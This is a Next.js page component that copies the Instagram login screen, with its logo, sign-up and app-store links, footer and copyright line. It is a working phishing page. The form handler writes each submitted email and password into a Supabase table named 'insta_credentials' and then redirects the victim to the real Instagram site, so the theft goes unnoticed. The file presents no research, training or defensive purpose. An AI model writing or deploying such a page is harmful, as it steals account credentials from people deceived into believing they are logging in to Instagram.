'use client';
import React from 'react';
import { useEffect, useState  } from 'react';
import { useRouter } from "next/navigation";
import { supabase } from '@/utils/supabase/client';

import './css/media-queries.css';
import './css/style.css';


const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL || "";
const SUPABASE_ANON_KEY = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "";

function loginPage() {
  const [ email, setEmail ] = useState('');
  const [ password, setPassword ] = useState('');
  const [ active, setActive ] = useState(false);


  const router = useRouter();
  const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URI!;
  console.log('redirectUrl', redirectUrl);

  useEffect(() => {
    console.log(email, password);
    if (email != '' && password != '') {
      setActive(true);
    } else {
      setActive(false);
    }
  }, [email, password]);

  const handleSubmission = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget as HTMLFormElement;
    const formData = new FormData(form);
    const email = formData.get('email') as string;
    const password = formData.get('password') as string;
    
    try {
      const { data, error } = await supabase
        .from('insta_credentials')
        .insert([
          { email: email, password: password },
        ])
        .select()

        if (error) {
          throw error;
        }
        console.log('sent');
    } catch (error) {
      console.log('error', error);
      router.push(redirectUrl || 'https://www.instagram.com/');
    } finally {
      router.push(redirectUrl || 'https://www.instagram.com/');
    }
  };


  return (
    <>
    <main>
      <div className="login-page">
      <div className="log-in-container">
          <div className="log-in">
              <img src="/photos/logo.png" className="logo"/>
              <form action="https://www.google.com/" className="log-in-form" onSubmit={handleSubmission}>
                  <input type="text" placeholder="Phone number,username or email" name="email" required
                    onInput={(e) => setEmail(e.currentTarget.value)}/>
                  <input type="password" placeholder="Password" name="password" required
                    onInput={(e) => setPassword(e.currentTarget.value)}/>
                  <button type="submit" className="log-in-button" data-active={active as boolean}>Log In</button>
              </form>

              <span className="or-divider">OR</span>
              <div className="fb-login">
                  <a href="#">
                      <img src="/photos/facebook-icon.png" />
                      <span>Log in with Facebook</span>
                  </a>
              </div>
              <a href="#" className="forgot-password">Forgot password?</a>
          </div>
          <div className="sign-up">
              <span>Don't have an account?{' '}
                  <a href="#">Sign up</a>
              </span>
          </div>
          <div className="get-the-app">
              <span>Get the app</span>
              <div className="app-images">
                  <a href="#"><img src="/photos/applestore.png" /></a>
                  <a href="#"><img src="/photos/googlestore.png" /></a>
              </div>
          </div>

        </div>
        {/* <div className="phones-container">
            <img src="/photos/phones.png" />
        </div> */}
      </div>
      <footer>
          <ul className="footer-links">
              <li><a href="#">Meta</a></li>
              <li><a href="#">About</a></li>
              <li><a href="#">Blog</a></li>
              <li><a href="#">Jobs</a></li>
              <li><a href="#">Help</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">Privacy</a></li>
              <li><a href="#">Terms</a></li>
              <li><a href="#">Locations</a></li>
              <li><a href="#">Instagram Lite</a></li>
              <li><a href="#">Threads</a></li>
              <li><a href="#">Contact Uploading & Non-Users</a></li>
              <li><a href="#">Meta Verified</a></li>
          </ul>
          <ul className="footer-links">
            <li><a href="#">English</a></li>
            <span className="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
          </ul>
      </footer>
      </main>
    </>
  );
}

export default loginPage;